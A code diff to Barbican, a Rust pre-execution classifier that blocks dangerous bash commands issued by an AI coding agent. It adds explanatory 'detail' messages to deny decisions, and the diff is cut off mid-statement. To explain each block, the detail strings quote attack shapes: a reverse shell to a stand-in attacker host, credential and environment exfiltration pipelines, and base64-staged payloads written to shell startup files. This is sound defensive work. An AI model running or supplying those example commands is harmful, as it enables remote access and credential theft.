@@ -63,16 +63,76 @@ struct ToolInput {
 }
 
 /// The classifier's output. A `Deny` carries a short human-readable
-/// reason surfaced on stderr so the user sees why the call was blocked.
+/// `reason` surfaced on stderr so the user sees why the call was
+/// blocked, plus an optional `detail` with more context (what
+/// specifically tripped, why it matters, how to rework the command).
 ///
 /// Widened from `pub(crate)` to `pub` in 1.4.0 so the new wrapper
 /// binaries (`barbican-shell` / `barbican-python` / etc.) can
 /// classify an arbitrary `-c` body without going through the hook-
-/// JSON envelope.
+/// JSON envelope. The `detail` field was added in 1.5.0 to support
+/// the new `barbican explain` subcommand.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum Decision {
     Allow,
-    Deny { reason: String },
+    Deny {
+        reason: String,
+        detail: Option<String>,
+    },
+}
+
+/// What a single classifier returns when it fires. `reason` is the
+/// short headline (one line, ~60 chars); `detail` is an optional
+/// longer paragraph that explains what tripped and how to rework the
+/// command. Introduced in 1.5.0 so we don't have to thread
+/// `(String, Option<String>)` tuples through every classifier.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct DenyReason {
+    pub reason: String,
+    pub detail: Option<String>,
+}
+
+impl DenyReason {
+    /// Short-reason-only constructor: no detail. Used for classifiers
+    /// that haven't yet been enriched with a long-form explanation.
+    #[allow(dead_code)] // Adopted incrementally as each classifier enriches its reason.
+    pub(crate) fn short(reason: impl Into<String>) -> Self {
+        Self {
+            reason: reason.into(),
+            detail: None,
+        }
+    }
+
+    /// Reason + detail constructor.
+    pub(crate) fn with_detail(reason: impl Into<String>, detail: impl Into<String>) -> Self {
+        Self {
+            reason: reason.into(),
+            detail: Some(detail.into()),
+        }
+    }
+}
+
+impl From<DenyReason> for Decision {
+    fn from(r: DenyReason) -> Self {
+        Decision::Deny {
+            reason: r.reason,
+            detail: r.detail,
+        }
+    }
+}
+
+impl From<String> for Decision {
+    /// Adopt a bare reason string as a short (no-detail) Deny. Used by
+    /// classifiers that still return `Option<String>` — the callsite
+    /// just `.into()`s the unwrapped reason. Later commits enrich
+    /// individual classifiers by switching them to `Option<DenyReason>`
+    /// and routing through the `DenyReason -> Decision` impl above.
+    fn from(reason: String) -> Self {
+        Decision::Deny {
+            reason,
+            detail: None,
+        }
+    }
 }
 
 /// Run the `pre-bash` subcommand.
@@ -177,10 +237,13 @@ pub fn run() -> Result<()> {
 
     match classify_command(command) {
         Decision::Allow => std::process::exit(EXIT_ALLOW),
-        Decision::Deny { reason } => {
+        Decision::Deny { reason, detail } => {
             // Write the reason to stderr so Claude Code surfaces it
             // to the user, then exit with Claude Code's block code.
             let _ = writeln!(std::io::stderr(), "barbican: {reason}");
+            if let Some(d) = detail {
+                let _ = writeln!(std::io::stderr(), "detail: {d}");
+            }
             std::process::exit(EXIT_DENY);
         }
     }
@@ -205,11 +268,15 @@ pub mod __fuzz {
     pub enum Decision {
         /// The command passed every shipped classifier.
         Allow,
-        /// At least one classifier denied; `reason` is the human-
-        /// readable string the real hook writes to stderr.
+        /// At least one classifier denied; `reason` is the short
+        /// human-readable string the real hook writes to stderr, and
+        /// `detail` is an optional longer paragraph (added 1.5.0).
         Deny {
             /// Short reason string surfaced on `barbican: {reason}`.
             reason: String,
+            /// Optional long-form explanation. `None` for classifiers
+            /// that haven't yet been enriched with a detail string.
+            detail: Option<String>,
         },
     }
 
@@ -221,7 +288,7 @@ pub mod __fuzz {
     pub fn classify_command(command: &str) -> Decision {
         match super::classify_command(command) {
             super::Decision::Allow => Decision::Allow,
-            super::Decision::Deny { reason } => Decision::Deny { reason },
+            super::Decision::Deny { reason, detail } => Decision::Deny { reason, detail },
         }
     }
 
@@ -244,12 +311,26 @@ pub mod __fuzz {
 #[must_use]
 pub fn classify_command(command: &str) -> Decision {
     match parser::parse(command) {
-        Err(ParseError::Malformed) => Decision::Deny {
-            reason: "command could not be parsed safely (deny by default)".to_string(),
-        },
-        Err(ParseError::ParserInit) => Decision::Deny {
-            reason: "bash parser failed to initialize (deny by default)".to_string(),
-        },
+        Err(ParseError::Malformed) => DenyReason::with_detail(
+            "command could not be parsed safely (deny by default)",
+            "tree-sitter-bash rejected the input as incomplete or invalid. \
+             Common causes: unterminated quotes or backticks, a heredoc without \
+             its closing marker, an unbalanced `$(` / `${` / `(` / `{`, nesting \
+             deeper than Barbican's MAX_DEPTH, or binary bytes inside the \
+             script. Barbican denies by default rather than guess at a partial \
+             parse, since the untyped bytes might hide a dangerous composition. \
+             Rewrite the command with balanced quoting and try again.",
+        )
+        .into(),
+        Err(ParseError::ParserInit) => DenyReason::with_detail(
+            "bash parser failed to initialize (deny by default)",
+            "tree-sitter-bash could not set up its grammar — this is a build- \
+             or install-time issue with the Barbican binary, not a problem with \
+             your command. Reinstall Barbican (`barbican install`) and report \
+             the failure at https://github.com/jdidion/barbican/issues if it \
+             persists.",
+        )
+        .into(),
         Ok(script) => classify_script(&script),
     }
 }
@@ -259,11 +340,23 @@ fn classify_script(script: &Script) -> Decision {
     classify_script_with_depth(script, 0)
 }
 
+// Long by design: this is the classifier dispatch table — each `if let`
+// is one policy. Splitting just for the line count would hide the
+// readable "here are all the classifiers in order" view. The 1.5.0
+// `detail` strings pushed it over the 100-line pedantic cap.
+#[allow(clippy::too_many_lines)]
 fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
     if depth > M1_MAX_DEPTH {
-        return Decision::Deny {
-            reason: "command re-entry nesting exceeded safe depth (deny by default)".to_string(),
-        };
+        return DenyReason::with_detail(
+            "command re-entry nesting exceeded safe depth (deny by default)",
+            "the command wraps itself in `bash -c` / `eval` / `xargs` / \
+             `find -exec` / `sudo` / `timeout` / … more than 8 layers deep. \
+             Real workflows never need that; deep nesting is a classic \
+             technique for hiding a dangerous inner command from static \
+             analysis. Flatten the command so each classifier can see every \
+             argument directly.",
+        )
+        .into();
     }
     for pipeline in &script.pipelines {
         // M1 marker — the inner string of a wrapper failed to parse.
@@ -274,74 +367,78 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
             .iter()
             .any(|s| s.basename == MALFORMED_REENTRY_MARKER)
         {
-            return Decision::Deny {
-                reason: "wrapped command could not be parsed safely \
-                         (deny by default)"
-                    .to_string(),
-            };
+            return DenyReason::with_detail(
+                "wrapped command could not be parsed safely (deny by default)",
+                "a wrapper like `bash -c '…'` / `eval '…'` / `find -exec sh -c '…'` \
+                 contains an inner command string that tree-sitter-bash rejected. \
+                 Same causes as the top-level parse-fail path: unterminated \
+                 quotes, unbalanced brackets, heredoc without closing marker, \
+                 or binary bytes. Fix the inner string's quoting and re-run.",
+            )
+            .into();
         }
-        if let Some(reason) = h1_pipeline_curl_to_shell(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = h1_pipeline_curl_to_shell(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = h2_staged_decode_to_exec(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = h2_staged_decode_to_exec(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = m2_reverse_shell(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = m2_reverse_shell(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = m2_env_dump_to_network(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = m2_env_dump_to_network(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = m2_secret_or_base64_to_network(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = m2_secret_or_base64_to_network(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = m2_substitution_exfil(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = m2_substitution_exfil(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = m2_staged_payload_to_exec_target(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = m2_staged_payload_to_exec_target(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = persistence_write_to_shell_startup(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = persistence_write_to_shell_startup(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = shell_with_heredoc_or_herestring_body(pipeline, depth) {
-            return Decision::Deny { reason };
+        if let Some(r) = shell_with_heredoc_or_herestring_body(pipeline, depth) {
+            return r.into();
         }
-        if let Some(reason) = shell_with_stdin_script(pipeline, depth) {
-            return Decision::Deny { reason };
+        if let Some(r) = shell_with_stdin_script(pipeline, depth) {
+            return r.into();
         }
-        if let Some(reason) = shell_with_network_substitution(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = shell_with_network_substitution(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = network_with_shell_sink_substitution(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = network_with_shell_sink_substitution(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = xargs_arbitrary_amplifier(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = xargs_arbitrary_amplifier(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = rsync_dash_e_inner(pipeline, depth) {
-            return Decision::Deny { reason };
+        if let Some(r) = rsync_dash_e_inner(pipeline, depth) {
+            return r.into();
         }
-        if let Some(reason) = tar_command_exec(pipeline, depth) {
-            return Decision::Deny { reason };
+        if let Some(r) = tar_command_exec(pipeline, depth) {
+            return r.into();
         }
-        if let Some(reason) = pip_editable_vcs_install(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = pip_editable_vcs_install(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = scheduler_persistence(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = scheduler_persistence(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = git_config_injection(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = git_config_injection(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = scripting_lang_shellout(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = scripting_lang_shellout(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = chmod_plus_x_attacker_path(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = chmod_plus_x_attacker_path(pipeline) {
+            return r.into();
         }
-        if let Some(reason) = m2_git_hard_deny(pipeline) {
-            return Decision::Deny { reason };
+        if let Some(r) = m2_git_hard_deny(pipeline) {
+            return r.into();
         }
         // M1: if any stage is a re-entry wrapper, unwrap it into a
         // flattened pipeline whose stages are the wrapper's inner
@@ -349,16 +446,20 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
         // M2) see through `sudo`, `timeout`, `bash -c`, `find -exec`,
         // `xargs bash -c`, etc.
         if let Some(unwrapped) = unwrap_wrappers_in_pipeline(pipeline) {
-            if let Decision::Deny { reason } = classify_script_with_depth(&unwrapped, depth + 1) {
-                return Decision::Deny { reason };
+            if let Decision::Deny { reason, detail } =
+                classify_script_with_depth(&unwrapped, depth + 1)
+            {
+                return Decision::Deny { reason, detail };
             }
         }
     }
     for pipeline in &script.pipelines {
         for stage in &pipeline.stages {
             for sub in &stage.substitutions {
-                if let Decision::Deny { reason } = classify_script_with_depth(sub, depth + 1) {
-                    return Decision::Deny { reason };
+                if let Decision::Deny { reason, detail } =
+                    classify_script_with_depth(sub, depth + 1)
+                {
+                    return Decision::Deny { reason, detail };
                 }
             }
         }
@@ -1181,7 +1282,7 @@ fn is_value_taking_flag(wrapper: &str, arg: &str) -> bool {
 ///
 /// Basename normalization happens upstream in the parser: `stage.basename`
 /// is already `cmd_basename`-normalized (H1's original bypass class).
-fn h1_pipeline_curl_to_shell(pipeline: &Pipeline) -> Option<String> {
+fn h1_pipeline_curl_to_shell(pipeline: &Pipeline) -> Option<DenyReason> {
     let stages = &pipeline.stages;
     // Narthex-parity: H1 keys specifically on curl/wget, not all of
     // NETWORK_TOOLS_HARD. See `h1_curl_wget_scope_rationale` in the
@@ -1191,11 +1292,25 @@ fn h1_pipeline_curl_to_shell(pipeline: &Pipeline) -> Option<String> {
         .iter()
         .skip(net_idx + 1)
         .find(|s| is_h1_shell_sink(&s.basename))?;
-    Some(format!(
-        "blocked: `{net}` piped to shell interpreter `{sh}` (H1 — \
-         downloaded-content executed as script)",
-        net = stages[net_idx].basename,
-        sh = shell_stage.basename,
+    let net = &stages[net_idx].basename;
+    let sh = &shell_stage.basename;
+    Some(DenyReason::with_detail(
+        format!(
+            "blocked: `{net}` piped to shell interpreter `{sh}` (H1 — \
+             downloaded-content executed as script)"
+        ),
+        format!(
+            "the pipeline `{net} … | {sh}` would fetch bytes from the \
+             network and hand them directly to {sh} for execution. The \
+             user never gets a chance to see what ran — a compromised \
+             server, stale URL, or typosquatted hostname can silently \
+             ship code into your shell. Rework as two steps: download \
+             to a file (`{net} -o /tmp/install.sh …`), review or \
+             checksum-verify the file, then run it (`bash /tmp/install.sh`). \
+             If you must stream directly, pipe through a tool that lets \
+             you inspect first (e.g. `{net} … | less`, then re-run \
+             separately)."
+        ),
     ))
 }
 
@@ -1250,7 +1365,7 @@ fn is_curl_or_wget(basename: &str) -> bool {
 ///    `cat b.uue | uudecode -o /tmp/a.sh`.
 ///
 /// Returns `Some(reason)` if the pipeline matches.
-fn h2_staged_decode_to_exec(pipeline: &Pipeline) -> Option<String> {
+fn h2_staged_decode_to_exec(pipeline: &Pipeline) -> Option<DenyReason> {
     let has_decoder = pipeline.stages.iter().any(is_decode_stage);
     if !has_decoder {
         return None;
@@ -1279,12 +1394,26 @@ fn h2_staged_decode_to_exec(pipeline: &Pipeline) -> Option<String> {
     None
 }
 
-fn format_h2_reason(decoder: &str, target: &str) -> String {
-    format!(
-        "blocked: decode pipeline (decoder `{decoder}`) writes to \
-         execution-shaped target `{t}` (H2 — staged payload, evades \
-         curl|bash check)",
-        t = sanitize_reason_text(target),
+fn format_h2_reason(decoder: &str, target: &str) -> DenyReason {
+    let t = sanitize_reason_text(target);
+    DenyReason::with_detail(
+        format!(
+            "blocked: decode pipeline (decoder `{decoder}`) writes to \
+             execution-shaped target `{t}` (H2 — staged payload, evades \
+             curl|bash check)"
+        ),
+        format!(
+            "the pipeline runs a decoder (`{decoder}`) and lands the \
+             decoded bytes at `{t}`, whose path shape (a script \
+             extension, a known shell rc file, or a no-extension path \
+             in a commonly-exec'd directory) suggests that file will be \
+             executed. This is the `curl | bash` pattern split across \
+             two steps — a plaintext `curl … | bash` is obvious and \
+             gets blocked by H1, but `base64 -d blob > ~/.bashrc` hides \
+             behind encoding. If you actually want to install a decoded \
+             payload, decode it somewhere safe first (`base64 -d blob \
+             > /tmp/payload`), inspect it, then move/run it manually."
+        ),
     )
 }
 
@@ -1663,7 +1792,7 @@ fn stage_bn_lc(stage: &crate::parser::Command) -> String {
 /// M2 reverse-shell pattern: any argv/redirect references `/dev/tcp/*`
 /// or `/dev/udp/*`. This covers `bash -i >& /dev/tcp/host/port` and
 /// `cat </dev/tcp/host/port`.
-fn m2_reverse_shell(pipeline: &Pipeline) -> Option<String> {
+fn m2_reverse_shell(pipeline: &Pipeline) -> Option<DenyReason> {
     fn is_tcp_udp(s: &str) -> bool {
         s.contains("/dev/tcp/") || s.contains("/dev/udp/")
     }
@@ -1685,17 +1814,25 @@ fn m2_reverse_shell(pipeline: &Pipeline) -> Option<String> {
     None
 }
 
-fn reverse_shell_reason(token: &str) -> String {
-    format!(
-        "blocked: reverse-shell pattern — `{t}` references /dev/tcp or \
-         /dev/udp (M2)",
-        t = sanitize_reason_text(token),
+fn reverse_shell_reason(token: &str) -> DenyReason {
+    let t = sanitize_reason_text(token);
+    DenyReason::with_detail(
+        format!("blocked: reverse-shell pattern — `{t}` references /dev/tcp or /dev/udp (M2)"),
+        "bash exposes `/dev/tcp/host/port` and `/dev/udp/host/port` as \
+         pseudo-files that open raw TCP/UDP sockets. The classic \
+         reverse-shell payload `bash -i >& /dev/tcp/attacker/4444 0>&1` \
+         reads from and writes to those paths so the attacker's server \
+         has an interactive shell on this machine. There is no \
+         legitimate reason to reference `/dev/tcp/*` or `/dev/udp/*` in \
+         a day-to-day command — use `curl`, `nc`, or `socat` for \
+         ordinary network I/O."
+            .to_string(),
     )
 }
 
 /// M2 env dump → network: pipeline contains an env-dumper in any stage
 /// and a network tool in any later stage.
-fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<String> {
+fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     let env_idx = pipeline
         .stages
         .iter()
@@ -1709,11 +1846,23 @@ fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<String> {
         pipeline.stages.iter().skip(env_idx + 1).find(|s| {
             EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()) || is_expansion_argv0(s)
         })?;
-    Some(format!(
-        "blocked: environment dump (`{env}`) piped to network tool \
-         `{net}` (M2 — env-exfil)",
-        env = pipeline.stages[env_idx].basename,
-        net = net_stage.basename,
+    let env = &pipeline.stages[env_idx].basename;
+    let net = &net_stage.basename;
+    Some(DenyReason::with_detail(
+        format!(
+            "blocked: environment dump (`{env}`) piped to network tool `{net}` (M2 — env-exfil)"
+        ),
+        format!(
+            "`{env}` prints the process environment — which on a \
+             developer machine routinely contains `AWS_SECRET_ACCESS_KEY`, \
+             `GITHUB_TOKEN`, `OPENAI_API_KEY`, session cookies, and \
+             similar credentials. Piping that into `{net}` sends those \
+             secrets to the network endpoint at `{net}`'s destination. \
+             If you legitimately need to share env for debugging, \
+             redact first (`env | grep -v -E 'KEY|TOKEN|SECRET|PASSWORD'`) \
+             before any network step — or write to a local file and \
+             attach it via a channel you trust."
+        ),
     ))
 }
 
@@ -1721,7 +1870,7 @@ fn m2_env_dump_to_network(pipeline: &Pipeline) -> Option<String> {
 /// AND contains a network tool, OR pipes `base64` of a secret to a
 /// network tool. `git` participates if a secret is present (the split
 /// policy — benign `git push` without a secret reference is allowed).
-fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<String> {
+fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<DenyReason> {
     let has_secret = pipeline_mentions_secret(pipeline);
 
     // First branch: secret-path + any downstream network-ish stage.
@@ -1733,10 +1882,20 @@ fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<String> {
             let bn = stage_bn_lc(s);
             EXFIL_NETWORK_TOOLS.contains(bn.as_str()) || bn == "git" || is_expansion_argv0(s)
         }) {
-            return Some(format!(
-                "blocked: secret-path reference alongside network tool \
-                 `{net}` (M2 — credential exfil)",
-                net = net_stage.basename,
+            let net = net_stage.basename.clone();
+            return Some(DenyReason::with_detail(
+                format!("blocked: secret-path reference alongside network tool `{net}` (M2 — credential exfil)"),
+                format!(
+                    "the pipeline names a known credential-bearing path \
+                     (`~/.ssh/id_*`, `~/.aws/credentials`, `~/.kube/config`, \
+                     `.env`, and friends) and also runs `{net}`. Barbican \
+                     treats the co-occurrence as a credential-exfil \
+                     shape: even benign-looking `cat ~/.aws/credentials \
+                     | {net} …` lifts secrets off the box. If you need \
+                     to send these contents somewhere for a legitimate \
+                     reason (e.g. debugging a broken config), copy the \
+                     file elsewhere and redact it first."
+                ),
             ));
         }
     } else if let Some(net_stage) = pipeline
@@ -1764,10 +1923,22 @@ fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<String> {
         pipeline.stages.iter().skip(base64_idx + 1).find(|s| {
             EXFIL_NETWORK_TOOLS.contains(stage_bn_lc(s).as_str()) || is_expansion_argv0(s)
         })?;
-    Some(format!(
-        "blocked: base64-encoded content piped to network tool \
-         `{net}` (M2 — obfuscated exfil)",
-        net = net_stage.basename,
+    let net = net_stage.basename.clone();
+    Some(DenyReason::with_detail(
+        format!(
+            "blocked: base64-encoded content piped to network tool `{net}` (M2 — obfuscated exfil)"
+        ),
+        format!(
+            "piping a base64 encoder into `{net}` is the classic \
+             laundering step that turns arbitrary bytes (credentials, \
+             config, source) into an ASCII blob that ships cleanly over \
+             HTTP/DNS. Plaintext `{net}`s are common and legitimate; a \
+             `base64 | {net}` composition almost never is. If you need \
+             the encoding for a different purpose (e.g. an API payload), \
+             do the encoding and the request as two separate steps with \
+             a local file in between — the local file gives you a chance \
+             to see what's being uploaded."
+        ),
     ))
 }
 
@@ -1777,7 +1948,7 @@ fn m2_secret_or_base64_to_network(pipeline: &Pipeline) -> Option<String> {
 /// vice-versa. This closes the cross-`$(…)` / `<(…)` / `>(…)`
 /// source→sink bypass where the parent pipeline and the sub get
 /// classified separately and neither triggers on its own.
-fn m2_substitution_exfil(pipeline: &Pipeline) -> Option<String> {
+fn m2_substitution_exfil(pipeline: &Pipeline) -> Option<DenyReason> {
     // Collect the "signals" across the whole composition:
     //   (has_net_tool, has_secret_ref, has_env_dump, has_base64)
     // If combinations that indicate exfil appear, deny.
@@ -1816,9 +1987,23 @@ fn m2_substitution_exfil(pipeline: &Pipeline) -> Option<String> {
         } else {
             "base64-encoded content"
         };
-        return Some(format!(
-            "blocked: {kind} flows to network tool across a \
-             $(…) / <(…) / >(…) boundary (M2 — sub-exfil)"
+        return Some(DenyReason::with_detail(
+            format!(
+                "blocked: {kind} flows to network tool across a \
+                 $(…) / <(…) / >(…) boundary (M2 — sub-exfil)"
+            ),
+            "shell command substitutions (`$(…)`), process \
+             substitutions (`<(…)`, `>(…)`), and their nested forms \
+             evaluate as independent sub-scripts, so a classifier that \
+             only looks at the outer pipeline misses source→sink flows \
+             that cross the `$(…)` boundary. Barbican tracks signals \
+             (network tool, secret path, env dump, base64 encode) \
+             across that boundary and denies when one side is a sink \
+             and the other is a source of secrets. Rewrite the \
+             composition without the substitution — compute the inner \
+             value as a standalone step into a local variable, inspect \
+             it, then use it in the outer command."
+                .to_string(),
         ));
     }
     None
@@ -1861,7 +2046,7 @@ fn signals_in_pipeline(pipeline: &Pipeline) -> (bool, bool, bool, bool) {
 /// Matches `echo '<payload>' > /tmp/x.sh`, `printf '<payload>' > ...`,
 /// `cat > /tmp/x.sh << 'EOF' ... EOF`, and tee targets with the same
 /// shape.
-fn m2_staged_payload_to_exec_target(pipeline: &Pipeline) -> Option<String> {
+fn m2_staged_payload_to_exec_target(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         // Find the target of any `>` redirect or tee/uudecode output.
         let out_target = effective_out_file_target(stage).or_else(|| argv_output_target(stage));
@@ -1879,11 +2064,27 @@ fn m2_staged_payload_to_exec_target(pipeline: &Pipeline) -> Option<String> {
             continue;
         }
         if scan_payload_for_exfil(&payload_text) {
-            return Some(format!(
-                "blocked: payload written to execution-shaped target \
-                 `{t}` contains a credential path and a network tool \
-                 (M2 — staged exfiltration)",
-                t = sanitize_reason_text(&target),
+            let t = sanitize_reason_text(&target);
+            return Some(DenyReason::with_detail(
+                format!(
+                    "blocked: payload written to execution-shaped target \
+                     `{t}` contains a credential path and a network tool \
+                     (M2 — staged exfiltration)"
+                ),
+                format!(
+                    "the command writes a literal string to `{t}` (a path \
+                     whose shape suggests it will be executed later — a \
+                     script extension, a shell rc file, or a no-extension \
+                     path in an exec-prone directory), and that string \
+                     mentions BOTH a credential path (like `~/.ssh/id_*` \
+                     or `~/.aws/credentials`) AND a network tool \
+                     (`curl`, `wget`, `nc`, `scp`, …). The shape matches \
+                     a deferred exfil payload — the machine that runs \
+                     `{t}` later will read the credential and ship it. \
+                     If you're writing a legitimate config or alias, \
+                     move it to a non-exec location and review the \
+                     contents."
+                ),
             ));
         }
     }
@@ -2223,7 +2424,7 @@ fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
                             .to_string(),
                     );
                 };
-                if let Decision::Deny { reason } =
+                if let Decision::Deny { reason, .. } =
                     classify_script_with_depth(&inner_script, depth + 1)
                 {
                     return Some(format!(
@@ -2472,7 +2673,7 @@ fn classify_tar_inner(flag: &str, raw: &str, depth: usize) -> Option<String> {
     let stripped = strip_surrounding_quotes_owned(raw);
     match parser::parse(&stripped) {
         Ok(inner) => {
-            if let Decision::Deny { reason } = classify_script_with_depth(&inner, depth + 1) {
+            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth + 1) {
                 return Some(format!(
                     "blocked: tar `{flag}={stripped}` executes as a \
                      shell command — inner: {reason}",
@@ -2629,7 +2830,7 @@ fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> O
                     sh = stage.basename,
                 ));
             };
-            if let Decision::Deny { reason } = classify_script_with_depth(&inner, depth + 1) {
+            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth + 1) {
                 return Some(format!(
                     "blocked: shell interpreter `{sh}` executes a \
                      heredoc / here-string body — inner: {reason}",
@@ -2747,7 +2948,7 @@ fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> 
         // script that would itself deny, we deny too. This catches
         // nested shapes like `printf 'base64 -d blob > ~/.bashrc' | sh -s`.
         if let Ok(inner) = parser::parse(&payload) {
-            if let Decision::Deny { reason } = classify_script_with_depth(&inner, depth + 1) {
+            if let Decision::Deny { reason, .. } = classify_script_with_depth(&inner, depth + 1) {
                 return Some(format!(
                     "blocked: shell interpreter `{sh} -s` reads its \
                      script from stdin — upstream payload classifies \
@@ -3297,7 +3498,13 @@ fn lex_normalize_chmod_path(path: &str) -> String {
 /// blunt `has_curl` check.
 ///
 /// 1.2.0 5th-pass adversarial review (Claude SEVERE S-2).
-fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<String> {
+// Long by design: four distinct deny arms share a per-dialect inline-
+// code extractor. Splitting the arms into helpers would hide the
+// parallel structure and force each helper to re-run the extractor or
+// re-derive the basename. 1.5.0 added detail strings which tipped it
+// past the 100-line pedantic cap.
+#[allow(clippy::too_many_lines)]
+fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
         let bn = bn.as_str();
@@ -3335,12 +3542,26 @@ fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<String> {
         // The high-precision multi-signal scanner — same criteria M2
         // uses for staged-exfil bash payloads.
         if scan_payload_for_exfil(&code) {
-            return Some(format!(
-                "blocked: `{bn}` inline code contains a curl-to-shell \
-                 / secret-exfil / reverse-shell shape. Scripting \
-                 languages can spawn shells (os.system, subprocess, \
-                 system(), exec(), child_process.execSync) just like \
-                 `bash -c`, so the shape is classified identically.",
+            return Some(DenyReason::with_detail(
+                format!(
+                    "blocked: `{bn}` inline code contains a curl-to-shell \
+                     / secret-exfil / reverse-shell shape. Scripting \
+                     languages can spawn shells (os.system, subprocess, \
+                     system(), exec(), child_process.execSync) just like \
+                     `bash -c`, so the shape is classified identically."
+                ),
+                format!(
+                    "barbican can't fully interpret `{bn}` code, so it \
+                     string-scans inline programs for the same signals \
+                     M2 uses on bash payloads: a network tool name \
+                     (`curl`/`wget`/`nc`/…) co-occurring with a credential \
+                     path (`~/.ssh/id_*`, `~/.aws/credentials`, `.env`, …) \
+                     or an env-dumper. The co-occurrence in a single \
+                     `-c`/`-e` body almost always indicates an exfil \
+                     script. Rewrite the task so the language code and \
+                     the privileged operation live in separate steps, or \
+                     run the script from a file so it's reviewable."
+                ),
             ));
         }
         // 1.2.0 6th-pass review (GPT SEVERE G-S5):
@@ -3352,13 +3573,25 @@ fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<String> {
         //     miss `scan_payload_for_exfil`, but when paired with a
         //     subprocess spawn API it's unambiguous.
         if code_calls_subprocess(&code) && network_tool_word_regex().is_match(&code) {
-            return Some(format!(
-                "blocked: `{bn}` inline code invokes a \
-                 subprocess-spawning API (`os.system` / \
-                 `subprocess.*` / `system()` / `execSync` / \
-                 `ccall(:system` / `Runtime.exec`) and references a \
-                 network tool (curl/wget/nc/…) — \
-                 download-and-execute shape.",
+            return Some(DenyReason::with_detail(
+                format!(
+                    "blocked: `{bn}` inline code invokes a \
+                     subprocess-spawning API (`os.system` / \
+                     `subprocess.*` / `system()` / `execSync` / \
+                     `ccall(:system` / `Runtime.exec`) and references a \
+                     network tool (curl/wget/nc/…) — \
+                     download-and-execute shape."
+                ),
+                format!(
+                    "when `{bn}` code both spawns a subprocess AND names a \
+                     network tool, it's the language-level equivalent of \
+                     `bash -c 'curl … | bash'`: the script runs whatever \
+                     arrives over the wire. Rework so the download and \
+                     the execution are separate, user-reviewable steps. \
+                     If you only need to download (not execute), use \
+                     `{bn}`'s HTTP library directly and write to a local \
+                     path instead of shelling out to `curl`."
+                ),
             ));
         }
         // (b) Obfuscation-aware fallback. If the inline code calls
@@ -3367,11 +3600,24 @@ fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<String> {
         //     fragments like "cu"+"rl", chr() sequences), deny even
         //     when the static network-tool scan found nothing.
         if code_calls_subprocess(&code) && code_has_obfuscation_marker(&code) {
-            return Some(format!(
-                "blocked: `{bn}` inline code combines a \
-                 subprocess-spawning API with string-concatenation \
-                 or base64-decode obfuscation — a well-known pattern \
-                 for hiding a curl|bash payload from static scans.",
+            return Some(DenyReason::with_detail(
+                format!(
+                    "blocked: `{bn}` inline code combines a \
+                     subprocess-spawning API with string-concatenation \
+                     or base64-decode obfuscation — a well-known pattern \
+                     for hiding a curl|bash payload from static scans."
+                ),
+                format!(
+                    "a `{bn}` snippet that assembles strings from \
+                     fragments (`'cu' + 'rl'`), `chr()` sequences, hex \
+                     escapes (`\\x63\\x75\\x72\\x6c`), or a \
+                     `base64.b64decode(...)` literal and then passes the \
+                     result to a subprocess API is explicitly engineered \
+                     to evade string scans. Legitimate code almost never \
+                     needs this: there's no benign reason to hide the \
+                     binary name of a subprocess you're spawning. Rewrite \
+                     with the literal command inline."
+                ),
             ));
         }
         // Explicit `system("curl …")` / `execSync("curl …")` literal
@@ -3385,10 +3631,23 @@ fn scripting_lang_shellout(pipeline: &Pipeline) -> Option<String> {
             || lower.contains("system(\"wget")
             || lower.contains("system('wget")
         {
-            return Some(format!(
